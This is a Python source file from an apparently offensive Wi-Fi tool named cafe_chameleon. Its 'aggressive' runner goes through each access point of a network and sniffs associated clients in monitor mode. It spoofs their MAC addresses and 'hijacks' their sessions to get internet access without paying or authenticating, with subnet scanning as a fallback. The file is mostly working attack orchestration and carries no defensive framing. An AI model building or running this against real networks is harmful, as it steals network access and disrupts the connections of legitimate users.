"""
cafe_chameleon.aggressive.runner - Sequential multi-BSSID exploration & scanning execution runner.
"""

import sys
import time

from cafe_chameleon.utils.process import _run
from cafe_chameleon.utils.signals import register_signal_handler, HijackSkipInterrupt, MainSkipInterrupt
from cafe_chameleon.utils.state import set_restore_params
from cafe_chameleon.ui.console import (
    log_info,
    log_plus,
    log_warning,
    log_main,
    log_hijack,
    clear_window,
    log_step,
    log_wait
)
from cafe_chameleon.ui.prompts import ask_proceed, ask_restore
from cafe_chameleon.network.internet import has_internet
from cafe_chameleon.network.sysfs import wait_for_carrier
from cafe_chameleon.network.hijack import hijack, restore
from cafe_chameleon.network.dhcp import query_dhcp_lease_ip
from cafe_chameleon.network.mac import set_mac_address, reset_mac_address, get_attack_mac
from cafe_chameleon.utils.tracing import trace
from cafe_chameleon.network.nmcli import (
    get_active_profile,
    get_ssid_for_profile,
    scan_bssids_for_ssid,
    lock_bssid,
    restore_auto
)
from cafe_chameleon.scanners.detector import auto_detect_network_params
from cafe_chameleon.scanners.resolver import resolve_mac_to_ip
from cafe_chameleon.scanners.air_scanner import sniff_air_clients
from cafe_chameleon.aggressive.ranker import calculate_bssid_score


def run_scan_wrapper(args, quiet_header=False):
    """Deferred import to avoid circular dependency with simple scan runner."""
    from cafe_chameleon.cli.commands.simple import run_simple
    return run_simple(args, quiet_header=quiet_header)


def run_aggressive(args) -> bool:
    """
    Main subcommand handler for Aggressive mode.
    Connects to each available BSSID for the target SSID one by one,
    checking for internet access or scanning until internet access is granted.
    Supports --air over-the-air 802.11 monitor mode client discovery & direct takeover.
    """
    register_signal_handler()

    profile = getattr(args, "profile", None) or get_active_profile()
    if not profile:
        log_main("[-] Error: Could not auto-detect active Wi-Fi profile. Specify -p/--profile.")
        sys.exit(1)

    ssid = get_ssid_for_profile(profile)
    if not ssid:
        log_main(f"[-] Error: Could not determine SSID for profile '{profile}'.")
        sys.exit(1)

    interface = getattr(args, "interface", None) or "wlan0"
    trace(f"[FEATURE] Initializing Aggressive exploration mode on interface {interface} (Profile: '{profile}', SSID: '{ssid}')")

    air_arg = getattr(args, "air", None)
    is_air = air_arg is not None
    air_duration = 25

    if is_air:
        if isinstance(air_arg, int) and air_arg > 0:
            air_duration = air_arg
        elif sys.stdin.isatty():
            try:
                val = input("Enter duration in seconds to listen in monitor mode [default: 25]: ").strip()
                if val.isdigit() and int(val) > 0:
                    air_duration = int(val)
            except (KeyboardInterrupt, EOFError):
                pass

    log_main("========================================\n  AGGRESSIVE MULTI-BSSID EXPLORATION\n========================================", clear=True)
    log_main(f"Interface   : {interface}")
    log_main(f"Profile     : {profile}")
    log_main(f"SSID        : {ssid}")
    log_main(f"Air Sniff   : {'ENABLED (' + str(air_duration) + 's)' if is_air else 'DISABLED'}")
    log_main("----------------------------------------\n")

    # 1. Initial internet check
    if has_internet():
        if not getattr(args, "force", False):
            log_plus("Internet online.")
            log_main("[+] Internet online.")
            return True
        else:
            log_step("Internet online (--force enabled). Continuing exploration...")
            log_main("[!] Internet online (--force enabled). Continuing exploration...")

    # 2. Discover BSSIDs for the SSID
    bssids = scan_bssids_for_ssid(ssid)
    if not bssids:
        log_warning(f"No BSSIDs found for SSID '{ssid}'.")
        log_main(f"[-] No BSSIDs found for SSID '{ssid}'.")
        return False

    log_info(f"Found {len(bssids)} BSSID(s) for '{ssid}'. Starting exploration...")
    log_main(f"[+] Found {len(bssids)} BSSID(s) for '{ssid}':")

    # 3. If --air mode is enabled, sniff over-the-air Dot11 frames in monitor mode FIRST
    air_clients_map = {}
    if is_air:
        target_bssid_list = [b["bssid"] for b in bssids]
        target_channel_list = [b["chan"] for b in bssids if b.get("chan")]
        air_clients_map = sniff_air_clients(target_bssid_list, interface=interface, duration=air_duration, target_channels=target_channel_list)

    # 4. Auto-rank BSSIDs by client count & signal strength (highest score first)
    bssids.sort(key=lambda b: calculate_bssid_score(b, air_clients_map)[0], reverse=True)

    log_info("[+] Auto-Ranked BSSIDs:")
    log_main("\n================ AUTO-RANKED BSSIDS ================")
    for rank, b in enumerate(bssids, start=1):
        score, clients, sig = calculate_bssid_score(b, air_clients_map)
        log_main(f"  #{rank}: BSSID {b['bssid']} | Score: {score:<4} | Clients: {clients:<2} | Sig: {sig}% | Ch: {b['chan']}")
    log_main("----------------------------------------\n")

    if getattr(args, "select_bssid", False):
        log_main("\n================ DISCOVERED BSSIDS LIST ================")
        for i, b in enumerate(bssids, start=1):
            score, clients, sig = calculate_bssid_score(b, air_clients_map)
            log_main(f"  [{i}] {b['bssid']} (Clients: {clients}, Signal: {sig}%, Channel: {b['chan']})")
        log_main("----------------------------------------\n")

        selected_idx = 0
        try:
            sys.stdout.write(f"\033[93m[?] Enter starting BSSID number [1-{len(bssids)}, default: 1]: \033[0m")
            sys.stdout.flush()
            val = sys.stdin.readline().strip()
            if val.isdigit():
                num = int(val)
                if 1 <= num <= len(bssids):
                    selected_idx = num - 1
        except (KeyboardInterrupt, EOFError):
            sys.stdout.write("\n")
            pass

        if selected_idx > 0:
            bssids = bssids[selected_idx:] + bssids[:selected_idx]
            log_info(f"Selected starting BSSID: {bssids[0]['bssid']}")
            log_main(f"[+] Selected starting BSSID: {bssids[0]['bssid']}")

    tried_macs = set()
    last_skip_time = 0

    for idx, item in enumerate(bssids, start=1):
        target_bssid = item["bssid"]
        signal_pct = item["signal"]
        chan = item["chan"]

        try:
            # Clear scan & hijack windows for new BSSID
            clear_window("hijack")
            clear_window("scan")

            msg = f"[{idx}/{len(bssids)}] Target: {target_bssid} (Sig: {signal_pct}%, Ch: {chan})"
            log_info(msg)
            log_main(f"\n{msg}")

            # Apply attack MAC address before connecting/locking to BSSID
            attack_mac = get_attack_mac(interface)
            trace(f"[FEATURE] Applying attack MAC {attack_mac} before locking to BSSID {target_bssid}")
            set_mac_address(interface, attack_mac, profile=profile)

            # Lock connection to this BSSID
            if not lock_bssid(target_bssid, profile):
                log_warning(f"Skipping BSSID {target_bssid} (lock failed).")
                log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
                continue

            # Wait deterministically for adapter link readiness
            wait_for_carrier(interface, timeout=6.0)

            # Check if internet access is available immediately
            if has_internet():
                log_plus(f"SUCCESS! Internet verified on {target_bssid}!")
                log_main(f"\033[92m[+] SUCCESS! Internet verified on {target_bssid}!\033[0m")
                if not getattr(args, "force", False):
                    return True
                else:
                    log_step(f"--force enabled. Continuing attack on {target_bssid}...")
                    log_main(f"[!] --force enabled. Continuing attack on {target_bssid}...")

            # If over-the-air client targets were caught for this BSSID, impersonate each new target MAC directly
            bssid_air_clients = air_clients_map.get(target_bssid.lower(), {})
            auto_params = auto_detect_network_params(target_iface=interface)
            gw_mac_clean = (auto_params.get("gateway_mac") or "").lower()
            local_mac_clean = (auto_params.get("local_mac") or "").lower()
            all_bssids_clean = {b["bssid"].lower() for b in bssids}
            def is_valid_client(m_clean):
                if m_clean in tried_macs or m_clean in all_bssids_clean or m_clean == gw_mac_clean or m_clean == local_mac_clean:
                    return False
                if m_clean.startswith("01:00:5e") or m_clean.startswith("33:33") or m_clean.startswith("00:00:5e"):
                    return False
                try:
                    fb = int(m_clean.split(":")[0], 16)
                    if fb & 1:
                        return False
                except Exception:
                    return False
                if len(m_clean) >= 14:
                    pfx = m_clean[:14]
                    for b in all_bssids_clean:
                        if len(b) >= 14 and pfx == b[:14]:
                            return False
                return True

            new_air_clients = {
                mac: ip for mac, ip in bssid_air_clients.items()
                if is_valid_client(mac.lower())
            }

            if new_air_clients:
                log_step(f"Testing {len(new_air_clients)} air target(s)...")
                log_main(f"  -> Testing {len(new_air_clients)} air target(s)...")

                auto_ip = auto_params.get("local_ip") or "10.68.193.222"
                gw_ip = auto_params.get("gateway_ip", "")
                netmask = auto_params.get("cidr", "").split("/")[1] if auto_params.get("cidr") and "/" in auto_params.get("cidr") else "21"
                broadcast = auto_params.get("broadcast", "")
                local_mac = auto_params.get("local_mac", "")
                ipmask = auto_params.get("cidr", f"{auto_ip}/{netmask}")

                set_restore_params(interface, local_mac, ipmask, broadcast, gw_ip, callback=restore, profile=profile)

                for client_mac, client_ip in new_air_clients.items():
                    try:
                        tried_macs.add(client_mac.lower())

                        resolved_ip = client_ip or resolve_mac_to_ip(client_mac, interface, target_subnet=auto_params.get("cidr"))
                        
                        # Guaranteed IP Resolution via DHCP Lease Query after MAC spoofing
                        if not resolved_ip:
                            log_wait(f"Querying DHCP lease -> {client_mac}...")
                            log_hijack(f"[*] Querying DHCP lease -> {client_mac}...")
                            set_mac_address(interface, client_mac, profile=profile)
                            if not wait_for_carrier(interface, timeout=5.0):
                                lock_bssid(target_bssid, profile)
                                wait_for_carrier(interface, timeout=5.0)
                            resolved_ip = query_dhcp_lease_ip(interface, target_mac=client_mac)

                        target_ip = resolved_ip or auto_ip

                        # Ensure carrier is ready before hijack attempt
                        if not wait_for_carrier(interface, timeout=3.0):
                            lock_bssid(target_bssid, profile)
                            wait_for_carrier(interface, timeout=5.0)

                        hijack_success = hijack(interface, target_ip, client_mac, netmask, broadcast, gw_ip, max_retries=2, profile=profile, bssid=target_bssid, channel=chan)
                        if hijack_success:
                            log_plus(f"SUCCESS! Internet active via {client_mac} [{target_bssid}]")
                            log_main(f"\033[92m[+] SUCCESS! Internet active via {client_mac} [{target_bssid}]\033[0m")
                            if not getattr(args, "force", False):
                                return True

                        if getattr(args, "force", False):
                            if not ask_proceed():
                                log_warning("Stopped after impersonation.")
                                log_main("[-] Stopped after impersonation.")
                                has_acc = hijack_success or has_internet()
                                if ask_restore(default_restore=not has_acc):
                                    restore(interface, local_mac, ipmask, broadcast, gw_ip)
                                else:
                                    log_plus("Keeping current network config.")
                                return has_acc

                        time.sleep(0.5)
                    except HijackSkipInterrupt:
                        log_hijack(f"\033[93m[-] Skipped target {client_mac}\033[0m")
                        log_main(f"\033[93m[-] Skipped target {client_mac}\033[0m")
                        continue

                # Restore original interface MAC/IP after testing air targets
                has_acc = has_internet()
                if getattr(args, "force", False):
                    if ask_restore(default_restore=not has_acc):
                        restore(interface, local_mac, ipmask, broadcast, gw_ip)
                    else:
                        log_plus("Keeping current network config.")
                else:
                    if not has_acc:
                        restore(interface, local_mac, ipmask, broadcast, gw_ip)
                    else:
                        log_plus("Internet verified. Preserving configuration.")

            # Run subnet scanning on this BSSID if air targets didn't yield internet
            log_step(f"Scanning subnet on BSSID {target_bssid}...")
            log_main(f"  -> Scanning subnet on BSSID {target_bssid}...")
            log_hijack(f"[*] Scanning subnet on BSSID {target_bssid}...")
            setattr(args, "interface", interface)
            success = run_scan_wrapper(args, quiet_header=True)

            if success or (has_internet() and not getattr(args, "force", False)):
                log_plus(f"SUCCESS! Internet access granted via {target_bssid}!")
                log_main(f"\033[92m[+] SUCCESS! Internet access granted via {target_bssid}!\033[0m")
                if not getattr(args, "force", False):
                    return True

            log_warning(f"No internet on BSSID {target_bssid}. Moving next...")
            log_main(f"  [-] No internet on BSSID {target_bssid}. Moving next...")

        except (KeyboardInterrupt, MainSkipInterrupt):
            now = time.time()
            if now - last_skip_time < 1.5:
                log_warning("Double Ctrl+C. Exiting...")
                log_main("[-] Double Ctrl+C. Exiting...")
                restore_auto(profile)
                raise

            last_skip_time = now
            log_warning(f"Skipping BSSID {target_bssid} (Ctrl+C)...")
            log_main(f"\033[93m[-] Skipping BSSID {target_bssid} (Ctrl+C)...\033[0m")
            try:
                auto_params = auto_detect_network_params(target_iface=interface)
                gw_ip = auto_params.get("gateway_ip", "")
                local_mac = auto_params.get("local_mac", "")
                ipmask = auto_params.get("cidr", "")
                broadcast = auto_params.get("broadcast", "")
                if interface and local_mac and ipmask:
                    restore(interface, local_mac, ipmask, broadcast, gw_ip)
            except Exception:
                pass
            time.sleep(0.5)
            continue

    log_warning("Aggressive completed all BSSIDs without internet access.")
    log_main("[-] Aggressive completed all BSSIDs without internet access.")
    log_step("Restoring auto-roaming on profile...")
    restore_auto(profile)
    return False

